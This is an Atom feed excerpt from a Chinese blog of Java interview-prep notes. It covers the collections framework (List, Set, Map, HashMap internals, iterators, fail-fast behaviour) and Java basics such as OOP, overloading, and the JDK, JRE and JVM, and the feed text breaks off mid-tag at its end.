    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br>[文章都是搬运艿艿的]<br>[<a href="http://svip.iocoder.cn/Java/Core/Interview/]" target="_blank" rel="noopener">http://svip.iocoder.cn/Java/Core/Interview/]</a></excerpt></p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h3 id="Java集合概述图"><a href="#Java集合概述图" class="headerlink" title="Java集合概述图"></a>Java集合概述图</h3><p><a href="https://upload-images.jianshu.io/upload_images/1637925-3ef7a86d5856e763.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/747/format/jpeg" target="_blank" rel="noopener">概述图</a></p><h3 id="说出一些集合框架的优点？"><a href="#说出一些集合框架的优点？" class="headerlink" title="说出一些集合框架的优点？"></a>说出一些集合框架的优点？</h3><ol><li>使用核心集合类降低开发成本，而非实现我们自己的集合类。</li><li>随着使用经过严格测试的集合框架类，代码质量会得到提高。</li><li>通过使用 JDK 附带的集合类，可以降低代码维护成本。</li><li>复用性和可操作性。<h3 id="集合框架中的泛型有什么优点？"><a href="#集合框架中的泛型有什么优点？" class="headerlink" title="集合框架中的泛型有什么优点？"></a>集合框架中的泛型有什么优点？</h3><blockquote><p>Java5 引入了泛型，所有的集合接口和实现都大量地使用它。泛型允许我们为集合提供一个可以容纳的对象类型。因此，如果你添加其它类型的任何元素，它会在<br>编译时报错。这避免了在运行时出现 ClassCastException，因为你将会在编译时得到报错信息。</p></blockquote></li></ol><blockquote><p>泛型也使得代码整洁，我们不需要使用显式转换和 instanceOf 操作符。它也给运行时带来好处，因为不会产生类型检查的字节码指令</p></blockquote><h3 id="Java-集合框架的基础接口有哪些？"><a href="#Java-集合框架的基础接口有哪些？" class="headerlink" title="Java 集合框架的基础接口有哪些？"></a>Java 集合框架的基础接口有哪些？</h3><h4 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h4><blockquote><p>为集合层级的根接口。一个集合代表一组对象，这些对象即为它的元素。Java 平台不提供这个接口任何直接的实现。</p></blockquote><h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h4><p>是一个不能包含重复元素的集合。这个接口对数学集合抽象进行建模，被用来代表集合，就如一副牌。</p><h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><blockquote><p>是一个有序集合，可以包含重复元素。你可以通过它的索引来访问任何元素。List 更像长度动态变换的数组。</p></blockquote><h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><blockquote><p>是一个将 key 映射到 value 的对象。一个 Map 不能包含重复的 key，每个 key 最多只能映射一个 value 。</p></blockquote><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>一些其它的接口有 Queue、Dequeue、SortedSet、SortedMap 和 ListIterator 。</p><h3 id="为何-Collection-不从-Cloneable-和-Serializable-接口继承？"><a href="#为何-Collection-不从-Cloneable-和-Serializable-接口继承？" class="headerlink" title="为何 Collection 不从 Cloneable 和 Serializable 接口继承？"></a>为何 Collection 不从 Cloneable 和 Serializable 接口继承？</h3><blockquote><p>Collection 接口指定一组对象，对象即为它的元素<br>如何维护这些元素由 Collection 的具体实现决定。例如，一些如 List 的 Collection 实现允许重复的元素，而其它的如 Set 就不允许。<br>很多 Collection 实现有一个公有的 clone 方法。然而，把它放到集合的所有实现中也是没有意义的。这是因为 Collection 是一个抽象表现，重要的是实现。</p></blockquote><h3 id="为何-Map-接口不继承-Collection-接口？"><a href="#为何-Map-接口不继承-Collection-接口？" class="headerlink" title="为何 Map 接口不继承 Collection 接口？"></a>为何 Map 接口不继承 Collection 接口？</h3><blockquote><p>尽管 Map 接口和它的实现也是集合框架的一部分，但 Map 不是集合，集合也不是 Map。因此，Map 继承 Collection 毫无意义，反之亦然。<br>如果 Map 继承 Collection 接口，那么元素去哪儿？Map 包含 key-value 对，它提供抽取 key 或 value 列表集合( Collection )的方法，但是它不适合<br>“一组对象”规范。</p></blockquote><h3 id="Collection-和-Collections-的区别？"><a href="#Collection-和-Collections-的区别？" class="headerlink" title="Collection 和 Collections 的区别？"></a>Collection 和 Collections 的区别？</h3><blockquote><p>Collection ，是集合类的上级接口，继承与他的接口主要有 Set 和List 。<br>Collections ，是针对集合类的一个工具类，它提供一系列静态方法实现对各种集合的搜索、排序、线程安全化等操作。</p></blockquote><h3 id="集合框架里实现的通用算法有哪些？"><a href="#集合框架里实现的通用算法有哪些？" class="headerlink" title="集合框架里实现的通用算法有哪些？"></a>集合框架里实现的通用算法有哪些？</h3><blockquote><p>Java 集合框架提供常用的算法实现，比如排序和搜索。<br>Collections类包含这些方法实现。大部分算法是操作 List 的，但一部分对所有类型的集合都是可用的。部分算法有排序、搜索、混编、最大最小值。</p></blockquote><h3 id="集合框架底层数据结构总结"><a href="#集合框架底层数据结构总结" class="headerlink" title="集合框架底层数据结构总结"></a>集合框架底层数据结构总结</h3><h3 id="List-1"><a href="#List-1" class="headerlink" title="List"></a>List</h3><blockquote><ol><li>ArrayList ：Object 数组。</li><li>Vector ：Object 数组。</li><li>LinkedList ：双向链表(JDK6 之前为循环链表，JDK7 取消了循环)。</li></ol></blockquote><h3 id="Map-1"><a href="#Map-1" class="headerlink" title="Map"></a>Map</h3><blockquote><ol><li>HashMap ：<br>JDK8 之前，HashMap 由数组+链表组成的，数组是HashMap的主体，链表则是主要为了解决哈希冲突而存在的（“拉链法”解决冲突）。<br>JDK8 以后，在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8 ）时，将链表转化为红黑树，以减少搜索时间。</li><li>LinkedHashMap ：LinkedHashMap 继承自 HashMap，所以它的底层仍然是基于拉链式散列结构即由数组和链表或红黑树组成。另外，LinkedHashMap 在上<br>面结构的基础上，增加了一条双向链表，使得上面的结构可以保持键值对的插入顺序。同时通过对链表进行相应的操作，实现了访问顺序相关逻辑。详细可以查<br>看：《LinkedHashMap 源码详细分析（JDK1.8）》 。</li><li>Hashtable ：数组+链表组成的，数组是 HashMap 的主体，链表则是主要为了解决哈希冲突而存在的。</li><li>TreeMap ：红黑树（自平衡的排序二叉树）。</li></ol></blockquote><h3 id="Set-1"><a href="#Set-1" class="headerlink" title="Set"></a>Set</h3><p>HashSet ：无序，唯一，基于 HashMap 实现的，底层采用 HashMap 来保存元素。<br>LinkedHashSet ：LinkedHashSet 继承自 HashSet，并且其内部是通过 LinkedHashMap 来实现的。有点类似于我们之前说的LinkedHashMap 其内部是基于 HashMap 实现一样，不过还是有一点点区别的。<br>TreeSet ：有序，唯一，红黑树(自平衡的排序二叉树)。</p><h3 id="什么是迭代器-Iterator-？"><a href="#什么是迭代器-Iterator-？" class="headerlink" title="什么是迭代器(Iterator)？"></a>什么是迭代器(Iterator)？</h3><blockquote><p>Iterator 接口，提供了很多对集合元素进行迭代的方法。每一个集合类都包含了可以返回迭代器实例的迭代方法。迭代器可以在迭代的过程中删除底层集合的元<br>素，但是不可以直接调用集合的 #remove(Object Obj) 方法删除，可以通过迭代器的 #remove() 方法删除。</p></blockquote><h4 id="Iterator-和-ListIterator-的区别是什么？"><a href="#Iterator-和-ListIterator-的区别是什么？" class="headerlink" title="Iterator 和 ListIterator 的区别是什么？"></a>Iterator 和 ListIterator 的区别是什么？</h4><blockquote><p>Iterator 可用来遍历 Set 和 List 集合，但是 ListIterator 只能用来遍历 List。<br>Iterator 对集合只能是前向遍历，ListIterator 既可以前向也可以后向。<br>ListIterator 实现了 Iterator 接口，并包含其他的功能。比如：增加元素，替换元素，获取前一个和后一个元素的索引等等。</p></blockquote><h4 id="快速失败（fail-fast）和安全失败（fail-safe）的区别是什么？"><a href="#快速失败（fail-fast）和安全失败（fail-safe）的区别是什么？" class="headerlink" title="快速失败（fail-fast）和安全失败（fail-safe）的区别是什么？"></a>快速失败（fail-fast）和安全失败（fail-safe）的区别是什么？</h4><blockquote><p>差别在于 ConcurrentModification 异常：<br>快速失败：当你在迭代一个集合的时候，如果有另一个线程正在修改你正在访问的那个集合时，就会抛出一个 ConcurrentModification 异常。 在 java.util 包下的都是快速失败。<br>安全失败：你在迭代的时候会去底层集合做一个拷贝，所以你在修改上层集合的时候是不会受影响的，不会抛出 ConcurrentModification 异常。在 java.util.concurrent 包下的全是安全失败的。</p></blockquote><h4 id="如何删除-List-中的某个元素？"><a href="#如何删除-List-中的某个元素？" class="headerlink" title="如何删除 List 中的某个元素？"></a>如何删除 List 中的某个元素？</h4><blockquote><p>方式一，使用 Iterator ，顺序向下，如果找到元素，则使用 remove 方法进行移除。<br>方式二，倒序遍历 List ，如果找到元素，则使用 remove 方法进行移除。</p></blockquote><h4 id="Enumeration-和-Iterator-接口有什么不同？"><a href="#Enumeration-和-Iterator-接口有什么不同？" class="headerlink" title="Enumeration 和 Iterator 接口有什么不同？"></a>Enumeration 和 Iterator 接口有什么不同？</h4><blockquote><p>Enumeration 跟 Iterator 相比较快两倍，而且占用更少的内存。<br>但是，Iterator 相对于 Enumeration 更安全，因为其他线程不能修改当前迭代器遍历的集合对象。同时，Iterators 允许调用者从底层集合中移除元素，这些 Enumerations 都没法完成。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EnumerationTester</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">      Enumeration&lt;String&gt; days;</span><br><span class="line">      Vector&lt;String&gt; dayNames = <span class="keyword">new</span> Vector&lt;String&gt;();</span><br><span class="line">      dayNames.add(<span class="string">"Sunday"</span>);</span><br><span class="line">      dayNames.add(<span class="string">"Monday"</span>);</span><br><span class="line">      dayNames.add(<span class="string">"Tuesday"</span>);</span><br><span class="line">      dayNames.add(<span class="string">"Wednesday"</span>);</span><br><span class="line">      dayNames.add(<span class="string">"Thursday"</span>);</span><br><span class="line">      dayNames.add(<span class="string">"Friday"</span>);</span><br><span class="line">      dayNames.add(<span class="string">"Saturday"</span>);</span><br><span class="line">      days = dayNames.elements();</span><br><span class="line">      <span class="keyword">while</span> (days.hasMoreElements())&#123;</span><br><span class="line">         System.out.println(days.nextElement()); </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="为何-Iterator-接口没有具体的实现？"><a href="#为何-Iterator-接口没有具体的实现？" class="headerlink" title="为何 Iterator 接口没有具体的实现？"></a>为何 Iterator 接口没有具体的实现？</h4><blockquote><p>Iterator 接口，定义了遍历集合的方法，但它的实现则是集合实现类的责任。每个能够返回用于遍历的 Iterator 的集合类都有它自己的 Iterator 实现内部类。<br>这就允许集合类去选择迭代器是 fail-fast 还是 fail-safe 的。比如，ArrayList 迭代器是 fail-fast 的，而 CopyOnWriteArrayList 迭代器是 fail-safe 的。</p></blockquote><h3 id="Comparable-和-Comparator-的区别"><a href="#Comparable-和-Comparator-的区别" class="headerlink" title="Comparable 和 Comparator 的区别?"></a>Comparable 和 Comparator 的区别?</h3><blockquote><p>Comparable 接口，在 java.lang 包下，用于当前对象和其它对象的比较，所以它有一个 #compareTo(Object obj) 方法用来排序，该方法只有一个参数。<br>Comparator 接口，在 java.util 包下，用于传入的两个对象的比较，所以它有一个 #compare(Object obj1, Object obj2) 方法用来排序，该方法有两个参数。</p></blockquote><h4 id="compareTo-方法的返回值表示的意思？"><a href="#compareTo-方法的返回值表示的意思？" class="headerlink" title="compareTo 方法的返回值表示的意思？"></a>compareTo 方法的返回值表示的意思？</h4><blockquote><p>· 大于 0 ，表示对象大于参数对象。<br>· 小于 0 ，表示对象小于参数对象<br>· 等于 0 ，表示两者相等。</p></blockquote><h4 id="如何对-Object-的-List-排序？"><a href="#如何对-Object-的-List-排序？" class="headerlink" title="如何对 Object 的 List 排序？"></a>如何对 Object 的 List 排序？</h4><blockquote><p>对 Object[] 数组进行排序时，我们可以用 Arrays#sort(…) 方法。<br>对 List<object> 数组进行排序时，我们可以用 Collections#sort(…) 方法。</object></p></blockquote><h3 id="List-VS-Set"><a href="#List-VS-Set" class="headerlink" title="List VS Set"></a>List VS Set</h3><h4 id="List-和-Set-区别？"><a href="#List-和-Set-区别？" class="headerlink" title="List 和 Set 区别？"></a>List 和 Set 区别？</h4><blockquote><p>List，Set 都是继承自 Collection 接口。<br>· List 特点：元素有放入顺序，元素可重复。<br>· Set 特点：元素无放入顺序，元素不可重复，重复元素会覆盖掉。</p></blockquote><blockquote><p>注意：元素虽然无放入顺序，但是元素在 Set 中的位置是有该元素的 hashcode 决定的，其位置其实是固定的。<br>另外 List 支持 for 循环，也就是通过下标来遍历，也可以用迭代器，但是 Set 只能用迭代，因为他无序，无法用下标来取得想要的值。</p></blockquote><h4 id="Set-和-List-对比："><a href="#Set-和-List-对比：" class="headerlink" title="Set 和 List 对比："></a>Set 和 List 对比：</h4><blockquote><p>Set：检索指定的元素效率高，删除和插入效率高，插入和删除可能会引起元素位置改变。<br>List：和数组类似，List 可以动态增长，查找指定的元素效率低，插入删除指定的元素效率低，因为可能会引起其他元素位置改变。</p></blockquote><h3 id="Array系-VS-List系"><a href="#Array系-VS-List系" class="headerlink" title="Array系 VS List系"></a>Array系 VS List系</h3><h4 id="Array-和-ArrayList-有何区别？什么时候更适合用-Array？"><a href="#Array-和-ArrayList-有何区别？什么时候更适合用-Array？" class="headerlink" title="Array 和 ArrayList 有何区别？什么时候更适合用 Array？"></a>Array 和 ArrayList 有何区别？什么时候更适合用 Array？</h4><blockquote><p>Array 可以容纳基本类型和对象，而 ArrayList 只能容纳对象。<br>Array 是指定大小的，而 ArrayList 大小是固定的，可自动扩容。<br>Array 没有提供 ArrayList 那么多功能，比如 addAll、removeAll 和 iterator 等。<br>尽管 ArrayList 明显是更好的选择，但也有些时候 Array 比较好用，比如下面的三种情况。</p></blockquote><blockquote><p>1、如果列表的大小已经指定，大部分情况下是存储和遍历它们<br>2、对于遍历基本数据类型，尽管 Collections 使用自动装箱来减轻编码任务，在指定大小的基本类型的列表上工作也会变得很慢。<br>3、如果你要使用多维数组，使用 [][] 比 List 会方便。</p></blockquote><h4 id="ArrayList-与-LinkedList-区别？"><a href="#ArrayList-与-LinkedList-区别？" class="headerlink" title="ArrayList 与 LinkedList 区别？"></a>ArrayList 与 LinkedList 区别？</h4><h5 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h5><blockquote><p>优点：ArrayList 是实现了基于动态数组的数据结构，因为地址连续，一旦数据存储好了，查询操作效率会比较高（在内存里是连着放的）。<br>缺点：因为地址连续，ArrayList 要移动数据，所以插入和删除操作效率比较低。</p></blockquote><h5 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h5><blockquote><p>优点：LinkedList 基于链表的数据结构，地址是任意的，所以在开辟内存空间的时候不需要等一个连续的地址。对于新增和删除操作 add 和 remove ，LinedList 比较占优势。LinkedList 适用于要头尾操<br>作或插入指定位置的场景。<br>缺点：因为 LinkedList 要移动指针，所以查询操作性能比较低。</p></blockquote><h5 id="适用场景分析："><a href="#适用场景分析：" class="headerlink" title="适用场景分析："></a>适用场景分析：</h5><blockquote><p>当需要对数据进行对随机访问的情况下，选用 ArrayList 。<br>当需要对数据进行多次增加删除修改时，采用 LinkedList 。</p></blockquote><h4 id="ArrayList-是如何扩容的？"><a href="#ArrayList-是如何扩容的？" class="headerlink" title="ArrayList 是如何扩容的？"></a>ArrayList 是如何扩容的？</h4><blockquote><p>如果通过无参构造的话，初始数组容量为 0 ，当真正对数组进行添加时，才真正分配容量。每次按照 1.5 倍（位运算）的比率通过 copeOf 的方式扩容。<br>在 JKD6 中实现是，如果通过无参构造的话，初始数组容量为10，每次通过 copeOf 的方式扩容后容量为原来的 1.5 倍。</p></blockquote><h4 id="ArrayList-与-Vector-区别？"><a href="#ArrayList-与-Vector-区别？" class="headerlink" title="ArrayList 与 Vector 区别？"></a>ArrayList 与 Vector 区别？</h4><p>rrayList 和 Vector 都是用数组实现的，主要有这么三个区别：</p><blockquote><ol><li>Vector 是多线程安全的，线程安全就是说多线程访问同一代码，不会产生不确定的结果，而 ArrayList 不是。这个可以从源码中看出，Vector 类中的方法很多有 synchronized 进行修饰，这样就导致<br>了 Vector 在效率上无法与 ArrayList 相比。</li><li>两个都是采用的线性连续空间存储元素，但是当空间不足的时候，两个类的增加方式是不同。</li><li>Vector 可以设置增长因子，而 ArrayList 不可以</li></ol></blockquote><blockquote><p>Vector 是线程同步的，所以它也是线程安全的，而 ArrayList 是线程无需同步的，是不安全的。如果不考虑到线程的安全因素，一般用 ArrayList 效率比较高。<br>实际场景下，如果需要多线程访问安全的数组，使用 CopyOnWriteArrayList 。<br>如果集合中的元素的数目大于目前集合数组的长度时，在集合中使用数据量比较大的数据，用 Vector 有一定的优势。</p></blockquote><h3 id="HashMap-和-Hashtable-的区别？"><a href="#HashMap-和-Hashtable-的区别？" class="headerlink" title="HashMap 和 Hashtable 的区别？"></a>HashMap 和 Hashtable 的区别？</h3><blockquote><ol><li>Hashtable 是在 Java 1.0 的时候创建的，而集合的统一规范命名是在后来的 Java2.0 开始约定的，而当时其他一部分集合类的发布构成了新的集合框架。<br>Hashtable 继承 Dictionary ，HashMap 继承的是 Java2 出现的 Map 接口。</li><li>HashMap 去掉了 Hashtable 的 contains 方法，但是加上了 containsValue 和 containsKey 方法。</li><li>HashMap 允许空键值，而 Hashtable 不允许。<br>【重点】4. HashTable 是同步的，而 HashMap 是非同步的，效率上比 HashTable 要高。也因此，HashMap 更适合于单线程环境，而 HashTable 适合于多线程环境。</li><li>HashMap 的迭代器（Iterator）是 fail-fast 迭代器，HashTable的 enumerator 迭代器不是 fail-fast 的。</li><li>HashTable 中数组默认大小是 11 ，扩容方法是 old * 2 + 1 ，HashMap 默认大小是 16 ，扩容每次为 2 的指数大小。<br>即使在多线程环境下，现在也有同步的 ConcurrentHashMap 替代，没有必要因为是多线程而用 Hashtable </li></ol></blockquote><h3 id="HashSet-和-HashMap-的区别？"><a href="#HashSet-和-HashMap-的区别？" class="headerlink" title="HashSet 和 HashMap 的区别？"></a>HashSet 和 HashMap 的区别？</h3><blockquote><p>Set 是线性结构，值不能重复。HashSet 是 Set 的 hash 实现，HashSet 中值不能重复是用 HashMap 的 key 来实现的。<br>Map 是键值对映射，可以空键空值。HashMap 是 Map 的 hash 实现，key 的唯一性是通过 key 值 hashcode 的唯一来确定，value 值是则是链表结构</p></blockquote><h3 id="HashSet-和-TreeSet-的区别？"><a href="#HashSet-和-TreeSet-的区别？" class="headerlink" title="HashSet 和 TreeSet 的区别？"></a>HashSet 和 TreeSet 的区别？</h3><blockquote><p>HashSet 是用一个 hash 表来实现的，因此，它的元素是无序的。添加，删除和 HashSet 包括的方法的持续时间复杂度是 O(1) 。<br>TreeSet 是用一个树形结构实现的，因此，它是有序的。添加，删除和 TreeSet 包含的方法的持续时间复杂度是 O(logn) 。</p></blockquote><h3 id="如何决定选用-HashMap-还是-TreeMap？"><a href="#如何决定选用-HashMap-还是-TreeMap？" class="headerlink" title="如何决定选用 HashMap 还是 TreeMap？"></a>如何决定选用 HashMap 还是 TreeMap？</h3><blockquote><p>对于在 Map 中插入、删除和定位元素这类操作，HashMap 是最好的选择。<br>然而，假如你需要对一个有序的 key 集合进行遍历， TreeMap 是更好的选择。</p></blockquote><h3 id="HashMap-和-ConcurrentHashMap-的区别？"><a href="#HashMap-和-ConcurrentHashMap-的区别？" class="headerlink" title="HashMap 和 ConcurrentHashMap 的区别？"></a>HashMap 和 ConcurrentHashMap 的区别？</h3><p>ConcurrentHashMap 是线程安全的 HashMap 的实现。主要区别如下：</p><blockquote><p>1、ConcurrentHashMap 对整个桶数组进行了分割分段(Segment)，然后在每一个分段上都用 lock 锁进行保护，相对 于Hashtable 的 syn 关键字锁的粒度更精细了一些，并发性能更好。而 HashMap 没有<br>锁机制，不是线程安全的。<br>JDK8 之后，ConcurrentHashMap 启用了一种全新的方式实现,利用 CAS 算法。<br>2、HashMap 的键值对允许有 null ，但是 ConCurrentHashMap 都不允许。</p></blockquote><h3 id="HashMap-的工作原理是什么？"><a href="#HashMap-的工作原理是什么？" class="headerlink" title="HashMap 的工作原理是什么？"></a>HashMap 的工作原理是什么？</h3><p><a href="http://dl2.iteye.com/upload/attachment/0017/7479/3f05dd61-955e-3eb2-bf8e-31da8a361148.jpg" target="_blank" rel="noopener">HashMap</a></p><blockquote><p>我们知道在 Java 中最常用的两种结构是数组和模拟指针（引用），几乎所有的数据结构都可以利用这两种来组合实现，HashMap 也是如此。实际上 HashMap 是一个“链表散列”。<br>HashMap 是基于 hashing 的原理。</p></blockquote><h4 id="当两个对象的-hashCode-相同会发生什么？"><a href="#当两个对象的-hashCode-相同会发生什么？" class="headerlink" title="当两个对象的 hashCode 相同会发生什么？"></a>当两个对象的 hashCode 相同会发生什么？</h4><blockquote><p>因为 hashcode 相同，所以它们的 bucket 位置相同，“碰撞”会发生。<br>因为 HashMap 使用链表存储对象，这个 Entry（包含有键值对的 Map.Entry 对象）会存储在链表中。</p></blockquote><h4 id="HashMap-默认容量是多少？"><a href="#HashMap-默认容量是多少？" class="headerlink" title="HashMap 默认容量是多少？"></a>HashMap 默认容量是多少？</h4><blockquote><p>默认容量都是 16 ，负载因子是 0.75 。就是当 HashMap 填充了 75% 的 busket 是就会扩容，最小的可能性是（16 * 0.75 = 12），一般为原内存的 2 倍。</p></blockquote></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;[文章都是搬运艿艿的]&lt;br&gt;[&lt;a href=&quot;http://svip.iocoder.cn/Java/Core/Interview/]&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://svip.iocoder.cn/Java/Core/Interview/]&lt;/a&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·Java基础》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/04/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-Java%E5%9F%BA%E7%A1%80/"/>
    <id>http://runindark.com/2020/03/04/2020春招/我为阿里-Java基础/</id>
    <published>2020-03-04T15:47:00.777Z</published>
    <updated>2020-06-28T01:43:26.140Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br>[文章都是搬运艿艿的]<br>[<a href="http://svip.iocoder.cn/Java/Core/Interview/]" target="_blank" rel="noopener">http://svip.iocoder.cn/Java/Core/Interview/]</a></excerpt></p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h3 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h3><h4 id="什么是面向对象？"><a href="#什么是面向对象？" class="headerlink" title="什么是面向对象？"></a>什么是面向对象？</h4><blockquote><p>面向对象是一种思想，世间万物都可以看做一个对象，这里只讨论面向对象编程（OOP），Java 是一个支持并发、基于类和面向对象的计算机编程语言。面向对象&gt;软件开发具有以下优点：</p></blockquote><blockquote><p>· 代码开发模块化，更易维护和修改。<br>· 代码复用性强。<br>· 增强代码的可靠性和灵活性。<br>· 增加代码的可读性。</p></blockquote><h4 id="请说说面向对象的特征"><a href="#请说说面向对象的特征" class="headerlink" title="请说说面向对象的特征"></a>请说说面向对象的特征</h4><blockquote><p>封装、继承、多态、抽象</p></blockquote><h4 id="重载和重写的区别？"><a href="#重载和重写的区别？" class="headerlink" title="重载和重写的区别？"></a>重载和重写的区别？</h4><blockquote><p>1）重写 override<br>· 方法名、参数、返回值相同。<br>· 子类方法不能缩小父类方法的访问权限。<br>· 子类方法不能抛出比父类方法更多的异常(但子类方法可以不抛出异常)。<br>· 存在于父类和子类之间。<br>· 方法被定义为 final 不能被重写。<br>2）重载 overload<br>· 参数类型、个数、顺序至少有一个不相同。<br>· 不能重载只有返回值不同的方法名。<br>· 存在于父类和子类、同类中。</p></blockquote><h4 id="Java-中，什么是构造方法？什么是构造方法重载？什么是拷贝构造方法？"><a href="#Java-中，什么是构造方法？什么是构造方法重载？什么是拷贝构造方法？" class="headerlink" title="Java 中，什么是构造方法？什么是构造方法重载？什么是拷贝构造方法？"></a>Java 中，什么是构造方法？什么是构造方法重载？什么是拷贝构造方法？</h4><blockquote><p>1）构造方法<br>当新对象被创建的时候，构造方法会被调用。每一个类都有构造方法。在程序员没有给类提供构造方法的情况下，Java 编译器会为这个类创建一个默认的构造方法。<br>2）构造方法重载<br>Java 中构造方法重载和方法重载很相似。可以为一个类创建多个构造方法。每一个构造方法必须有它自己唯一的参数列表。<br>3）拷贝构造方法<br>Java 不支持像 C++ 中那样的拷贝构造方法，这个不同点是因为如果你不自己写构造方法的情况下，Java 不会创建默认的拷贝构造方法。</p></blockquote><h4 id="JDK、JRE、JVM-分别是什么关系？"><a href="#JDK、JRE、JVM-分别是什么关系？" class="headerlink" title="JDK、JRE、JVM 分别是什么关系？"></a>JDK、JRE、JVM 分别是什么关系？</h4><blockquote><p>JDK 即为 Java 开发工具包，包含编写 Java 程序所必须的编译、运行等开发工具以及 JRE。开发工具如：<br>· 用于编译 Java 程序的 javac 命令。<br>· 用于启动 JVM 运行 Java 程序的 Java 命令。<br>· 用于生成文档的 Javadoc 命令。<br>· 用于打包的 jar 命令等等。<br>简单说，就是 JDK 包含 JRE 包含 JVM<br>JRE 即为 Java 运行环境，提供了运行 Java 应用程序所必须的软件环境，包含有 Java 虚拟机（JVM）和丰富的系统类库。系统类库即为 Java 提前封装好的功能类，只需拿来直接使用即可，可以大大的提高开发效率。<br>JVM 即为 Java 虚拟机，提供了字节码文件(.class)的运行环境支持</p></blockquote><h4 id="为什么-Java-被称作是“平台无关的编程语言”？"><a href="#为什么-Java-被称作是“平台无关的编程语言”？" class="headerlink" title="为什么 Java 被称作是“平台无关的编程语言”？"></a>为什么 Java 被称作是“平台无关的编程语言”？</h4><blockquote><p>Java 虚拟机是一个可以执行 Java 字节码的虚拟机进程。<br>Java 源文件( .java )被编译成能被 Java 虚拟机执行的字节码文件( .class )。<br>Java 被设计成允许应用程序可以运行在任意的平台，而不需要程序员为每一个平台单独重写或者是重新编译。Java 虚拟机让这个变为可能，因为它知道底层硬件平台的指令长度和其他特性。</p></blockquote><h4 id="JDK8-引入了什么重要的特性"><a href="#JDK8-引入了什么重要的特性" class="headerlink" title="JDK8 引入了什么重要的特性?"></a>JDK8 引入了什么重要的特性?</h4><blockquote><p>Lambda 表达式和集合之流式</p></blockquote><h4 id="什么是字节码？采用字节码的最大好处是什么"><a href="#什么是字节码？采用字节码的最大好处是什么" class="headerlink" title="什么是字节码？采用字节码的最大好处是什么"></a>什么是字节码？采用字节码的最大好处是什么</h4><blockquote><p>Java 源代码=&gt; 编译器 =&gt; JVM 可执行的 Java 字节码(即虚拟指令)=&gt; JVM =&gt; JVM 中解释器 =&gt; 机器可执行的二进制机器码 =&gt; 程序运行<br>Java 中引入了虚拟机的概念，即在机器和编译程序之间加入了一层抽象的虚拟的机器。这台虚拟的机器在任何平台上都提供给编译程序一个的共同的接口。<br>编译程序只需要面向虚拟机，生成虚拟机能够理解的代码，然后由解释器来将虚拟机代码转换为特定系统的机器码执行。在 Java 中，这种供虚拟机理解的代码叫做字节码（即扩展名为 .class 的文件），它不<br>面向任何特定的处理器，只面向虚拟机。<br>每一种平台的解释器是不同的，但是实现的虚拟机是相同的。Java 源程序经过编译器编译后变成字节码，字节码由虚拟机解释执行，虚拟机将每一条要执行的字节码送给解释器，解释器将其翻译成特定机器上的<br>机器码，然后在特定的机器上运行。这也就是解释了 Java 的编译与解释并存的特点。<br>字节码的好处<br>Java 语言通过字节码的方式，在一定程度上解决了传统解释型语言执行效率低的问题，同时又保留了解释型语言可移植的特点。所以 Java 程序运行时比较高效，而且，由于字节码并不专对一种特定的机器，<br>因此，Java程序无须重新编译便可在多种不同的计算机上运行。</p></blockquote><h4 id="Java-中的几种基本数据类型是什么？"><a href="#Java-中的几种基本数据类型是什么？" class="headerlink" title="Java 中的几种基本数据类型是什么？"></a>Java 中的几种基本数据类型是什么？</h4><blockquote><p>引用类型声明的变量是指该变量在内存中实际存储的是一个引用地址，实体在堆中<br>· 引用类型包括类、接口、数组等。<br>· 特别注意，String 是引用类型不是基本类型。</p></blockquote><h4 id="什么是值传递和引用传递？"><a href="#什么是值传递和引用传递？" class="headerlink" title="什么是值传递和引用传递？"></a>什么是值传递和引用传递？</h4><blockquote><p>· 值传递，是对基本型变量而言的，传递的是该变量的一个副本，改变副本不影响原变量。<br>· 引用传递，一般是对于对象型变量而言的，传递的是该对象地址的一个副本，并不是原对象本身<br>一般认为，Java 内的传递都是值传递，Java 中实例对象的传递是引用传递</p></blockquote><h4 id="是否可以在-static-环境中访问非-static-变量？"><a 